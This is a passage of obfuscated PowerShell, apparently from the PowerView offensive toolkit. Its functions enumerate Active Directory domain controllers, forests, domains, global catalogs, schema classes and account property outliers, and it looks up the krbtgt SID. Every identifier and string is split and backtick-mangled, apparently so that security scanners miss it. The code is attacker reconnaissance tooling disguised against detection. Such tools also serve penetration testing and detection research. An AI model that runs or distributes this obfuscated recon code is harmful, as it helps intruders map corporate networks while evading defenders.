        [Alias({"{1}{2}{0}{3}" -f 'ntrolle','Doma','inCo','r'})]
        [String]
        ${s`erV`Er},

        [Switch]
        ${Ld`AP},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEdE`N`TIaL} =   (  &("{0}{1}"-f'I','TEm')  ('variaBLE:J'+'h'+'3xo'+'6')  )."vA`LUE"::"EM`ptY"
    )

    PROCESS {
        ${argU`ME`NtS} = @{}
        if (${Ps`BoUNd`PAR`AmeTE`Rs}[("{1}{0}"-f 'ain','Dom')]) { ${AR`guM`enTs}[("{0}{1}" -f'Dom','ain')] = ${d`omAiN} }
        if (${pS`Boun`D`PArAmet`ers}[("{2}{0}{3}{1}"-f 'redent','l','C','ia')]) { ${a`RguM`EnTS}[("{2}{1}{0}"-f 'tial','reden','C')] = ${cre`dent`iAl} }

        if (${pSBoU`ND`pA`RAmEt`e`Rs}[("{0}{1}"-f 'LDA','P')] -or ${P`SBoUndPaR`AME`TErs}[("{1}{0}"-f 'erver','S')]) {
            if (${pS`Bo`UndP`A`RametERs}[("{0}{1}" -f 'Se','rver')]) { ${AR`GU`mE`Nts}[("{0}{1}"-f 'Serv','er')] = ${se`RVer} }

            
            ${arGuM`En`Ts}[("{1}{0}{2}" -f'DAPF','L','ilter')] = (("{2}{8}{7}{3}{4}{0}{6}{5}{9}{1}" -f'tContr',':=8192)','(use','u','n','.840.113556.1','ol:1.2','Acco','r','.4.803'))

            &("{3}{2}{4}{1}{0}" -f'r','inCompute','e','G','t-Doma') @Arguments
        }
        else {
            ${FoUNdDO`Ma`IN} = &("{0}{2}{1}"-f 'Get-','ain','Dom') @Arguments
            if (${f`O`UNdDOMAin}) {
                ${FOunD`dom`AIn}."dOMA`i`N`CoNTroLlERs"
            }
        }
    }
}


function gEt-fo`Re`sT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{1}{3}{2}"-f'SSh','ouldPr','ss','oce','P'}, '')]
    [OutputType({"{4}{1}{0}{3}{2}{5}{6}" -f'tion.P','ma','Cu','S','System.Management.Auto','s','tomObject'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValUefRoMpipeLiNe = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Fo`REst},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EDeN`T`Ial} =  (  &("{3}{0}{2}{1}" -f 'T-vaR','bLe','iA','Ge') ("{0}{1}"-f'JH3','xO6')  )."vA`LUe"::"e`MPTY"
    )

    PROCESS {
        if (${PsBOund`P`A`RamEt`erS}[("{0}{2}{1}" -f 'Crede','tial','n')]) {

            &("{2}{0}{1}" -f'e-Verbos','e','Writ') ("{6}{1}{8}{0}{5}{3}{7}{4}{9}{10}{2}"-f 'Using','t-','-Forest','e cre','a',' alternat','[Ge','denti','Forest] ','ls for G','et')

            if (${PSbounDpArA`me`Te`RS}[("{2}{0}{1}"-f'o','rest','F')]) {
                ${Tar`g`etFo`REST} = ${fOr`E`st}
            }
            else {
                
                ${t`AR`GEt`FoReSt} = ${cRe`De`NtIal}.("{1}{0}{4}{2}{3}{5}" -f 'N','Get','ork','Cr','etw','edential').Invoke()."dOM`A`iN"
                &("{2}{4}{1}{0}{3}"-f 'Verbo','e-','Wri','se','t') ('[G'+'e'+'t-'+'Forest'+'] '+'Extrac'+'t'+'ed '+'domain'+' '+"'$Forest' "+'from'+' '+'-'+'Cre'+'de'+'ntial')
            }

            ${FoRe`STC`on`TE`xT} = &("{0}{2}{1}" -f'Ne','Object','w-') ("{7}{10}{0}{5}{1}{6}{3}{9}{11}{12}{2}{8}{4}{13}"-f'Directory','e','ry.','ActiveD','ctor','Servic','s.','System','Dire','i','.','re','cto','yContext')(("{0}{1}"-f'Fore','st'), ${tArGEtf`ore`St}, ${cRe`DE`N`TIaL}."Us`E`RnAME", ${cr`e`denTIAL}.("{1}{2}{0}{3}"-f 'reden','GetNetwor','kC','tial').Invoke()."pAS`sWOrD")

            try {
                ${FOR`EstObj`ECt} =   ${g0ns}::("{1}{2}{0}" -f'est','G','etFor').Invoke(${Fo`RESTcoN`T`EXt})
            }
            catch {
                &("{4}{3}{1}{2}{0}" -f 'e','Ve','rbos','-','Write') ('['+'Get-Fo'+'r'+'est] '+'The'+' '+'s'+'pec'+'ified'+' '+'f'+'orest '+"'$TargetForest' "+'does'+' '+'n'+'ot '+'exi'+'st'+', '+'cou'+'ld'+' '+'n'+'ot '+'be'+' '+'conta'+'cted,'+' '+'the'+'re '+('isn{'+'0'+'}t ')  -F  [char]39+'a'+'n '+'e'+'x'+'ist'+'ing '+'t'+'rus'+'t, '+'or'+' '+'th'+'e '+'sp'+'e'+'cified '+'crede'+'nt'+'ials '+'a'+'re '+'in'+'valid: '+"$_")
                ${Nu`Ll}
            }
        }
        elseif (${P`SB`oU`NDParaME`TerS}[("{0}{1}{2}" -f'Fo','res','t')]) {
            ${f`oreSt`coNtExt} = &("{1}{2}{0}"-f't','New-Obje','c') ("{4}{8}{3}{7}{0}{5}{11}{17}{14}{2}{13}{10}{9}{6}{12}{1}{16}{15}" -f'er','y.Director','Activ','em.Di','Sys','v','c','rectoryS','t','re','Di','ic','tor','e','.','Context','y','es')(("{0}{1}" -f'Fo','rest'), ${f`OrE`ST})
            try {
                ${fo`REstOBJ`eCT} =   ${G0NS}::("{0}{1}{2}" -f'GetFo','res','t').Invoke(${fOrE`stCOn`T`exT})
            }
            catch {
                &("{1}{0}{3}{2}" -f 'te-Ve','Wri','ose','rb') ('[Ge'+'t-F'+'ores'+'t] '+'T'+'he '+'spe'+'cified'+' '+'fore'+'st '+"'$Forest' "+'d'+'oes '+'not'+' '+'exist,'+' '+'c'+'oul'+'d '+'not'+' '+'be'+' '+'con'+'tac'+'ted'+', '+'o'+'r '+'ther'+'e '+(('is'+'nN'+'wet ')  -REplaCE  ([char]78+[char]119+[char]101),[char]39)+'an'+' '+'e'+'xisting '+'trust'+': '+"$_")
                return ${NU`lL}
            }
        }
        else {
            
            ${foREStO`B`JE`CT} =  ${g0`Ns}::("{0}{2}{1}{3}"-f 'GetCur','entFores','r','t').Invoke()
        }

        if (${fO`R`ESt`O`BjeCt}) {
            
            if (${PsboUn`dPaR`AMeT`ERS}[("{0}{2}{1}" -f'Cred','al','enti')]) {
                ${f`ORest`sID} = (&("{1}{0}{2}" -f 'nU','Get-Domai','ser') -Identity ("{0}{2}{1}" -f 'krb','t','tg') -Domain ${f`O`REsTobJ`e`cT}."rO`oTD`om`Ain"."na`ME" -Credential ${CRedenT`I`AL})."o`BJ`eCTsId"
            }
            else {
                ${FOReS`T`SId} = (&("{3}{1}{0}{2}" -f'n','t-Domai','User','Ge') -Identity ("{2}{0}{1}" -f 'tg','t','krb') -Domain ${FOR`EST`OBJecT}."rO`OTDO`M`AiN"."n`AmE")."oBj`ecTSID"
            }

            ${p`ArTS} = ${F`oReS`TsId} -Split '-'
            ${for`e`STs`ID} = ${pAr`Ts}[0..$(${pa`R`Ts}."L`ENg`Th"-2)] -join '-'
            ${F`oR`E`S`TOBjecT} | &("{0}{3}{1}{2}" -f'Add','mb','er','-Me') ("{3}{2}{0}{1}" -f 'op','erty','ePr','Not') ("{3}{2}{1}{0}"-f 'id','ainS','tDom','Roo') ${FOR`est`sID}
            ${FO`RE`STOb`j`ECt}
        }
    }
}


function gET-FO`R`esTD`Oma`iN {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{3}{0}{1}"-f's','s','Sho','uldProce','PS'}, '')]
    [OutputType({"{1}{2}{4}{0}{5}{8}{6}{3}{7}" -f'.Di','Sy','st','eDirector','em','rectory','Activ','y.Domain','Services.'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTiON = 0, vAlUeFRompiPELinE = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fo`RE`ST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRedE`N`TI`Al} =  (  &("{1}{2}{3}{0}"-f 'bLe','GEt-V','AR','Ia') ("jH3XO"+"6") -VaLu  )::"EmP`TY"
    )

    PROCESS {
        ${AR`GU`meNTs} = @{}
        if (${p`sboun`DpaRaMEt`ERS}[("{1}{0}" -f 'st','Fore')]) { ${A`RG`UMeNTS}[("{1}{0}"-f 'orest','F')] = ${F`Ore`ST} }
        if (${p`sbouNd`p`ARAMe`TE`RS}[("{1}{2}{0}" -f 'l','Cred','entia')]) { ${aR`G`UmenTs}[("{1}{0}{2}" -f'redent','C','ial')] = ${crEd`e`N`TiaL} }

        ${Fo`ReStO`B`JE`CT} = &("{1}{0}{2}" -f 'Fo','Get-','rest') @Arguments
        if (${Fo`ReSt`oBj`eCT}) {
            ${F`oRE`s`To`BJEcT}."DOm`AInS"
        }
    }
}


function G`E`T`-FoReSTGlo`Ba`Lcat`ALoG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{3}{1}{0}" -f 's','oces','P','houldPr','SS'}, '')]
    [OutputType({"{4}{9}{0}{7}{3}{6}{2}{8}{5}{1}"-f '.D','obalCatalog','c','ectoryServices.Active','Sys','ory.Gl','Dire','ir','t','tem'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITIon = 0, vALUeFromPIpEliNE = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fO`RE`ST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EDEn`Tial} =  (&("{0}{2}{1}"-f'VAri','E','aBl') ("{0}{2}{1}"-f 'JH','Xo6','3')  -VaLuEonl)::"emp`Ty"
    )

    PROCESS {
        ${Argu`mE`Nts} = @{}
        if (${pSB`o`Un`dparaMEtErs}[("{2}{1}{0}"-f't','s','Fore')]) { ${A`RgU`MEnTs}[("{2}{0}{1}" -f'es','t','For')] = ${f`ore`ST} }
        if (${p`S`B`Ou`NDpArAmeTerS}[("{0}{2}{1}"-f 'Cre','al','denti')]) { ${Ar`GUMe`Nts}[("{1}{0}{2}"-f't','Creden','ial')] = ${cr`Ed`enT`Ial} }

        ${fO`R`EStO`BJ`ect} = &("{0}{2}{1}" -f 'Ge','Forest','t-') @Arguments

        if (${f`O`RestO`BjEct}) {
            ${FO`Res`TobJE`cT}.("{0}{2}{3}{1}"-f'FindAllGloba','ogs','lC','atal').Invoke()
        }
    }
}


function Get-fo`RestscH`E`MAC`l`Ass {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}"-f'PSSho','Proces','s','uld'}, '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(POSitiOn = 0, valUefROMPipELine = ${TR`Ue})]
        [Alias({"{1}{0}" -f 's','Clas'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`laSs`Name},

        [Alias({"{0}{1}" -f'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`oresT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`d`enTIAl} =  ( &("{1}{2}{0}"-f 'ABLE','v','Ari') ('jh'+'3'+'xO6'))."V`AluE"::"emp`TY"
    )

    PROCESS {
        ${aR`gumE`Nts} = @{}
        if (${PS`Boundp`ARametE`Rs}[("{0}{1}"-f'Fore','st')]) { ${A`R`GUME`NTs}[("{0}{1}" -f'Fore','st')] = ${FoR`e`St} }
        if (${pS`Boundpar`AME`T`E`RS}[("{1}{0}{2}"-f'dent','Cre','ial')]) { ${a`RgUMeN`Ts}[("{0}{1}{2}"-f 'Cr','ede','ntial')] = ${CR`ed`e`NtIAl} }

        ${FOR`Est`ObJ`EcT} = &("{2}{1}{0}"-f't','et-Fores','G') @Arguments

        if (${fOr`e`STO`BjeCT}) {
            if (${PSbOuNdp`Ar`A`mET`Ers}[("{1}{0}{2}" -f 'assNam','Cl','e')]) {
                ForEach (${tARge`T`Cla`sS} in ${CLA`SSnA`me}) {
                    ${FORe`S`ToBje`ct}."SCH`eMA".("{0}{2}{1}"-f'F','ss','indCla').Invoke(${t`ARge`T`claSs})
                }
            }
            else {
                ${FORE`St`oBjeCt}."sch`emA".("{0}{3}{1}{2}"-f'Fin','llClas','ses','dA').Invoke()
            }
        }
    }
}


function FIND-`dOmAINoB`jE`Ct`prO`P`e`RTyOu`TLiEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}{3}" -f'PS','Sh','ou','ldProcess'}, '')]
    [OutputType({"{4}{0}{1}{3}{2}"-f'we','rView.Prop','Outlier','erty','Po'})]
    [CmdletBinding(dEFaULtpArAMETeRSeTName = {"{0}{1}{2}" -f'Cl','as','sName'})]
    Param(
        [Parameter(POSITiON = 0, mAndAtOry = ${Tr`UE}, paraMETeRsetNAme = "Classn`A`Me")]
        [Alias({"{0}{1}" -f 'Clas','s'})]
        [ValidateSet({"{1}{0}"-f 'r','Use'}, {"{1}{0}"-f 'p','Grou'}, {"{0}{2}{1}" -f'C','r','ompute'})]
        [String]
        ${cL`AsSn`AmE},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${R`e`FEre`NCePRoPeRty`SeT},

        [Parameter(VAlUefRoMPIPElInE = ${t`RUE}, MAndatorY = ${t`RUE}, pARAMEtERseTnaME = "REfe`RE`N`CEOBj`ECt")]
        [PSCustomObject]
        ${REfEre`NcEOB`JeCt},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`M`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filte','r'})]
        [String]
        ${lDA`pfi`l`TEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'th','ADSPa'})]
        [String]
        ${S`eaRc`h`BaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}"-f 'ler','ontrol','inC','Doma'})]
        [String]
        ${S`eRV`eR},

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{0}{1}"-f'O','neLevel'}, {"{2}{0}{1}"-f'u','btree','S'})]
        [String]
        ${searC`Hs`co`Pe} = ("{1}{0}{2}"-f'b','Su','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`Ul`TPagEsi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RVE`RTImelImIt},

        [Switch]
        ${ToMBST`O`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`den`TiaL} =  ${j`H3X`o6}::"em`pty"
    )

    BEGIN {
        ${US`eR`ReferE`NcEPRop`ErTYsET} = @(("{1}{3}{0}{2}" -f 'ncoun','ad','t','mi'),("{3}{2}{1}{0}" -f 'es','untexpir','cco','a'),("{0}{2}{1}"-f 'ba','sswordtime','dpa'),("{0}{3}{2}{1}"-f 'bad','ount','wdc','p'),'cn',("{2}{0}{1}"-f'e','page','cod'),("{2}{1}{0}{3}" -f'try','un','co','code'),("{0}{1}{2}{3}"-f 'd','escr','iptio','n'), ("{0}{2}{1}" -f'di','me','splayna'),("{5}{1}{4}{3}{2}{0}"-f 'me','t','ishedna','gu','in','dis'),("{1}{3}{2}{5}{6}{4}{0}"-f'ondata','dsc','r','orep','gati','op','a'),("{2}{0}{1}"-f'iv','enname','g'),("{1}{0}{3}{2}"-f'st','in','pe','ancety'),("{5}{4}{0}{1}{2}{3}{6}" -f 'ritica','lsy','stem','obje','c','is','ct'),("{2}{0}{1}" -f 'og','off','lastl'),("{2}{0}{3}{1}" -f 'stl','gon','la','o'),("{1}{3}{2}{0}"-f'mp','lastl','gontimesta','o'),("{2}{1}{0}{3}"-f 'm','i','lockoutt','e'),("{0}{1}{2}"-f'lo','goncou','nt'),("{0}{2}{1}"-f 'membe','of','r'),("{1}{6}{5}{4}{2}{0}{7}{8}{3}" -f'rypt','m','nc','pes','tede','ds-suppor','s','ion','ty'),("{0}{1}"-f'n','ame'),("{2}{1}{0}" -f'ry','catego','object'),("{1}{0}{2}"-f'jectc','ob','lass'),("{2}{0}{3}{1}" -f'jectgu','d','ob','i'),("{1}{0}{2}" -f 'ect','obj','sid'),("{2}{0}{1}" -f 'imary','groupid','pr'),("{0}{2}{1}" -f'pwdla','tset','s'),("{2}{0}{1}"-f 'm','accountname','sa'),("{3}{0}{1}{4}{2}"-f 'ma','cco','nttype','sa','u'),'sn',("{2}{1}{3}{0}" -f 'trol','eracco','us','untcon'),("{4}{0}{3}{5}{1}{2}" -f 'se','cipa','lname','rp','u','rin'),("{1}{2}{0}" -f 'nchanged','u','s'),("{2}{0}{1}"-f'sncreat','ed','u'),("{2}{1}{0}{3}"-f'enchan','h','w','ged'),("{0}{1}{2}"-f 'w','hen','created'))

        ${grOU`p`RE`FEReNceProPer`T`YseT} = @(("{2}{1}{0}"-f't','dmincoun','a'),'cn',("{0}{1}{2}" -f'desc','rip','tion'),("{0}{1}{2}{3}" -f 'd','istingui','she','dname'),("{2}{4}{5}{3}{0}{1}"-f'ond','ata','dscore','ti','p','ropaga'),("{2}{1}{0}" -f 'uptype','o','gr'),("{2}{1}{0}{3}"-f 'ncet','sta','in','ype'),("{0}{1}{2}{3}"-f 'i','scriticalsystemo','bjec','t'),("{1}{0}" -f'ber','mem'),("{2}{0}{1}" -f'mbe','rof','me'),("{1}{0}" -f'e','nam'),("{1}{4}{3}{0}{2}"-f'eg','obj','ory','at','ectc'),("{0}{2}{1}" -f 'object','ss','cla'),("{0}{1}{2}" -f 'obj','ect','guid'),("{1}{2}{0}"-f 'tsid','obje','c'),("{2}{1}{3}{0}" -f 'accountname','a','s','m'),("{2}{0}{1}{3}" -f 'oun','t','samacc','type'),("{2}{1}{0}" -f'gs','emfla','syst'),("{0}{1}{2}" -f'u','sn','changed'),("{0}{1}{2}"-f 'usn','c','reated'),("{2}{3}{1}{0}"-f'd','ge','whencha','n'),("{2}{1}{0}"-f 'ated','ncre','whe'))

        ${C`o`mpU`TErr`e`Fe`Ren`CePRoPer`TYSeT} = @(("{1}{2}{3}{0}" -f'texpires','acc','ou','n'),("{3}{1}{0}{2}" -f 'o','assw','rdtime','badp'),("{3}{0}{1}{2}"-f'adpwdc','oun','t','b'),'cn',("{1}{0}" -f 'epage','cod'),("{2}{0}{1}"-f'ntryco','de','cou'),("{4}{2}{0}{1}{5}{3}" -f 'ed','na','ish','e','distingu','m'),("{1}{0}{2}" -f 'ostnam','dnsh','e'),("{1}{6}{4}{5}{2}{3}{0}"-f'a','dsc','tionda','t','a','ga','oreprop'),("{0}{2}{1}"-f'instance','e','typ'),("{3}{2}{0}{1}{4}"-f'stem','obj','iticalsy','iscr','ect'),("{1}{2}{0}"-f'f','lastlo','gof'),("{1}{2}{0}{3}" -f'ogo','last','l','n'),("{5}{1}{0}{4}{3}{2}" -f'o','tlog','estamp','im','nt','las'),("{0}{1}{2}"-f 'loca','lpoli','cyflags'),("{1}{0}{2}" -f'cou','logon','nt'),("{2}{4}{3}{0}{1}" -f'p','es','msds-supp','yptionty','ortedencr'),("{1}{0}"-f 'ame','n'),("{1}{0}{4}{3}{2}" -f 'ca','object','ry','go','te'),("{3}{2}{0}{1}"-f 'ctcl','ass','bje','o'),("{0}{2}{1}" -f 'obje','d','ctgui'),("{0}{2}{1}"-f'o','d','bjectsi'),("{4}{2}{0}{1}{3}"-f'eratin','gsyst','p','em','o'),("{2}{1}{0}{5}{4}{6}{7}{3}" -f'st','ingsy','operat','ck','m','e','servi','cepa'),("{1}{3}{2}{5}{0}{4}"-f'er','o','in','perat','sion','gsystemv'),("{0}{1}{2}" -f 'primarygr','o','upid'),("{1}{2}{0}" -f't','pwd','lastse'),("{0}{2}{3}{1}{4}"-f'samac','untnam','c','o','e'),("{0}{3}{2}{1}" -f's','type','unt','amacco'),("{0}{5}{3}{4}{1}{2}"-f's','paln','ame','rvi','ceprinci','e'),("{3}{2}{0}{1}"-f 'ccountcont','rol','ra','use'),("{0}{2}{1}" -f 'us','changed','n'),("{1}{0}{3}{2}"-f'c','usn','ated','re'),("{1}{2}{0}"-f 'nged','whench','a'),("{1}{2}{0}" -f 'ated','wh','encre'))

        ${sEarcheRAr`G`UmE`NtS} = @{}
        if (${ps`BO`UN`Dp`AR`AMEteRS}[("{0}{2}{1}" -f'D','main','o')]) { ${SEa`R`cheRA`RGUmEN`TS}[("{0}{1}"-f'Dom','ain')] = ${d`omain} }
        if (${PsBo`Un`DPAr`AMEters}[("{3}{2}{1}{0}" -f'ter','PFil','A','LD')]) { ${Sear`CheRArGu`M`eN`Ts}[("{1}{0}{2}"-f 'DAPF','L','ilter')] = ${LD`A`PF`iltEr} }
        if (${PSB`o`UNd`pAram`etE`RS}[("{1}{2}{0}" -f'e','Se','archBas')]) { ${SeaRc`heRA`RGume`N`TS}[("{0}{3}{1}{2}" -f'S','archB','ase','e')] = ${sEArc`HbA`SE} }
        if (${PSBOUn`DPAra`m`E`TErs}[("{1}{0}"-f'ver','Ser')]) { ${seArCHERa`R`G`UmEnTS}[("{1}{0}" -f'er','Serv')] = ${SeR`V`Er} }
        if (${ps`BOUn`DPa`RaM`eTerS}[("{0}{1}{2}{3}" -f 'Sea','r','chSc','ope')]) { ${SEar`CheR`AR`G`UMenTs}[("{1}{0}{2}" -f'rchSco','Sea','pe')] = ${S`eAR`ch`scOpE} }
        if (${pSB`OuNDpaRam`e`T`ERs}[("{4}{0}{3}{2}{1}" -f'esult','ize','S','Page','R')]) { ${SEar`CHerAr`G`Ume`N`Ts}[("{1}{0}{2}" -f 'tPag','Resul','eSize')] = ${ResulT`pAgE`siZE} }
        if (${P`Sbou`NDp`ArA`MEtERS}[("{3}{0}{1}{2}" -f 'e','rTimeL','imit','Serv')]) { ${SEA`RCH`erArguM`entS}[("{0}{3}{1}{2}"-f'S','Tim','eLimit','erver')] = ${SeRVE`R`T`IMEL`imiT} }
        if (${ps`Bou`N`Dp`Ar`AmeterS}[("{0}{2}{1}" -f 'Tom','e','bston')]) { ${SEAR`cHe`RARGu`MeN`Ts}[("{1}{2}{0}"-f 'e','T','ombston')] = ${toMb`sTO`NE} }
        if (${P`sBOunDp`AR`Am`EteRs}[("{0}{1}{2}" -f 'Cr','ed','ential')]) { ${Sea`RC`H`ER`ArgumeNTs}[("{1}{0}{2}" -f'en','Cred','tial')] = ${c`REDeN`Ti`AL} }

        
        if (${PsbOun`dp`ARaMEt`ERs}[("{0}{2}{1}"-f 'Do','n','mai')]) {
            if (${PSb`ou`N`d`PArAmeTErS}[("{0}{2}{1}" -f'Cr','al','edenti')]) {
                ${T`AR`GeTf`O`ReST} = &("{0}{1}{2}" -f'G','et-','Domain') -Domain ${D`OMaIn} | &("{3}{2}{1}{0}" -f 't','-Objec','ct','Sele') -ExpandProperty ("{2}{1}{0}"-f'st','e','For') | &("{0}{1}{2}" -f'S','el','ect-Object') -ExpandProperty ("{1}{0}"-f'ame','N')
            }
            else {
                ${TarGe`T`FoRE`sT} = &("{0}{1}{2}" -f 'Get-','Do','main') -Domain ${dO`m`AIN} -Credential ${crED`e`N`TiaL} | &("{1}{3}{2}{0}"-f 'ect','Sel','t-Obj','ec') -ExpandProperty ("{1}{0}" -f 'rest','Fo') | &("{1}{2}{0}"-f 'Object','Sel','ect-') -ExpandProperty ("{0}{1}"-f'N','ame')
            }
            &("{0}{3}{2}{1}"-f 'W','bose','ite-Ver','r') ('[Fin'+'d-Do'+'mainO'+'bjectP'+'roper'+'tyOu'+'t'+'li'+'e'+'r] '+'Enumerate'+'d'+' '+'fo'+'rest '+"'$TargetForest' "+'fo'+'r '+'t'+'arget '+'doma'+'in '+"'$Domain'")
        }

        ${scHeMA`ArGU`mE`NTs} = @{}
        if (${psBo`U`Nd`ParAm`eTERs}[("{1}{2}{0}" -f'tial','Cred','en')]) { ${SC`he`maaRgUMe`N`TS}[("{2}{0}{1}"-f 'dentia','l','Cre')] = ${CReDeN`Ti`Al} }
        if (${tARGEt`FO`Re`sT}) {
            ${SC`HE`MaAr`gUmENts}[("{0}{1}"-f'Fores','t')] = ${TarGE`TF`oreST}
        }
    }

    PROCESS {

        if (${P`s`BounDP`ArAmE`TeRs}[("{5}{4}{1}{2}{0}{3}" -f'tySe','eren','ceProper','t','f','Re')]) {
            &("{3}{2}{1}{0}" -f'rbose','e','ite-V','Wr') ("{5}{2}{4}{9}{6}{8}{10}{0}{3}{1}{7}{11}" -f'g specified -Refere','eProp','Object','nc','Prope','[Find-Domain','tl','ertySe','ier] ','rtyOu','Usin','t')
            ${rE`FErENce`obJe`ctPR`o`PE`RT`IeS} = ${R`eFErEnCEP`RoPE`RtyS`Et}
        }
        elseif (${PSbo`Undp`AR`AmEteRS}[("{1}{2}{3}{0}"-f'ct','Referen','c','eObje')]) {
            &("{0}{2}{1}"-f'W','te-Verbose','ri') ("{14}{11}{12}{4}{1}{17}{15}{3}{6}{5}{19}{16}{10}{8}{9}{13}{0}{7}{2}{18}" -f 'ct','pertyO','o',' property nam','o','s','e',' to use as the reference pr','r','e','fe','d-Dom','ainObjectPr','nceObje','[Fin','ng','rom -Re','utlier] Extracti','perty set',' f')
            ${Ref`ERe`N`cEObj`ECTp`RoPeRTIEs} = &("{2}{0}{1}" -f'-','Member','Get') -InputObject ${ref`e`ReNCEo`BJeCT} -MemberType ("{2}{0}{1}" -f'oteP','roperty','N') | &("{2}{0}{1}{3}"-f 'e','ct-Obje','Sel','ct') -Expand ("{0}{1}"-f'Na','me')
            ${R`eferen`C`eOBjEC`TcLaSs} = ${RefeR`e`NC`eO`BjECT}."O`BjeC`Tclass" | &("{2}{1}{0}"-f'ct','-Obje','Select') -Last 1
            &("{2}{3}{1}{0}{4}" -f'Verbos','-','Wr','ite','e') ('[F'+'ind-D'+'omai'+'n'+'O'+'bjectPropert'+'yOutl'+'i'+'er]'+' '+'C'+'alcu'+'lated '+'Re'+'fe'+'rence'+'Objec'+'tC'+'lass '+': '+"$ReferenceObjectClass")
        }
        else {
            &("{1}{3}{4}{2}{0}"-f'e','Wr','Verbos','i','te-') ('[Find-Dom'+'ainObjec'+'t'+'P'+'ropertyOutlie'+'r] '+'Usi'+'ng '+'the'+' '+'d'+'efault'+' '+'refere'+'nc'+'e '+'prop'+'ert'+'y'+' '+'se'+'t '+'for'+' '+'the'+' '+'ob'+'ject '+'clas'+'s '+"'$ClassName'")
        }

        if ((${ClASSN`A`Me} -eq ("{1}{0}"-f'er','Us')) -or (${R`EfeR`EncEObje`cT`clAss} -eq ("{0}{1}"-f'Use','r'))) {
            ${oB`jec`Ts} = &("{4}{3}{1}{0}{2}"-f 'ainUse','Dom','r','-','Get') @SearcherArguments
            if (-not ${R`EFErENcEo`Bj`E`C`TpRopertIeS}) {
                ${rEfER`eNCeobjeCt`PR`OpE`RTI`Es} = ${Us`E`R`RE`F`eRence`P`ROpERtySET}
            }
        }
        elseif ((${CL`As`sName} -eq ("{1}{0}"-f'up','Gro')) -or (${R`efERenceo`BjectcLa`sS} -eq ("{0}{1}"-f 'Gr','oup'))) {
            ${objE`C`TS} = &("{3}{0}{4}{1}{2}" -f 't-Do','ainGr','oup','Ge','m') @SearcherArguments
            if (-not ${ReFeR`eNC`eoBje`c`T`PRO`peRT`iEs}) {
                ${R`EFERenc`eO`Bje`CTp`RopE`RtIeS} = ${G`RoUP`Re`F`erENce`PrO`pE`RTYsEt}
            }
        }
        elseif ((${CL`ASsN`AME} -eq ("{1}{0}" -f'uter','Comp')) -or (${rEf`E`Ren`ceOb`J`EcT`CLaSS} -eq ("{1}{0}" -f 'r','Compute'))) {
            ${O`BJ`eCtS} = &("{5}{2}{0}{3}{4}{1}" -f 'main','uter','o','Co','mp','Get-D') @SearcherArguments
            if (-not ${reFEr`e`NceObJEc`Tp`R`O`PE`Rt`IEs}) {
                ${rEF`Er`eNCE`o`BjeCt`PropeRtIEs} = ${Comput`ERREf`er`enCepR`OPer`T`yS`ET}
            }
        }
        else {
            throw ('[Find-Domai'+'nO'+'bjectProp'+'ertyOut'+'l'+'ie'+'r]'+' '+'Inva'+'li'+'d '+'cla'+'ss: '+"$ClassName")
        }

        ForEach (${O`BJe`CT} in ${O`BJ`EcTs}) {
            ${obj`eCT`PrO`peR`TiES} = &("{1}{0}{2}"-f 'e','G','t-Member') -InputObject ${O`Bj`eCT} -MemberType ("{1}{2}{0}{3}"-f 'er','N','oteProp','ty') | &("{0}{1}{2}{4}{3}" -f'Se','le','ct-Obj','ct','e') -Expand ("{1}{0}"-f'me','Na')
            ForEach(${Ob`JeC`TpRoPE`R`TY} in ${OB`J`EcT`pR`opERt`ies}) {
                if (${rEF`erenceOBJect`p`Rop`ERTies} -NotContains ${O`BjECtPr`O`pE`RtY}) {
                    ${o`UT} = &("{0}{2}{1}" -f 'N','ect','ew-Obj') ("{2}{0}{1}"-f 'c','t','PSObje')
                    ${o`Ut} | &("{0}{2}{1}{3}" -f'Ad','-','d','Member') ("{1}{2}{0}"-f 'y','Noteprope','rt') ("{4}{0}{1}{2}{3}"-f 'amAcco','unt','Na','me','S') ${O`B`Ject}."s`AmacCoU`NTna`mE"
                    ${O`UT} | &("{1}{0}{2}"-f'dd-Mem','A','ber') ("{2}{1}{0}" -f'perty','tepro','No') ("{0}{1}{2}" -f 'Prop','e','rty') ${obJ`eCTpR`O`P`erty}
                    ${O`Ut} | &("{2}{1}{0}" -f'er','mb','Add-Me') ("{0}{2}{1}"-f'Notepro','rty','pe') ("{0}{1}"-f 'V','alue') ${ob`j`ECT}.${ObJect`prOPeR`Ty}
                    ${O`Ut}."PSO`BJ`EcT"."T`yPe`NameS".("{0}{1}"-f 'Inser','t').Invoke(0, ("{1}{5}{3}{0}{6}{7}{2}{4}" -f'ew.P','Pow','ertyO','Vi','utlier','er','r','op'))
                    ${o`UT}
                }
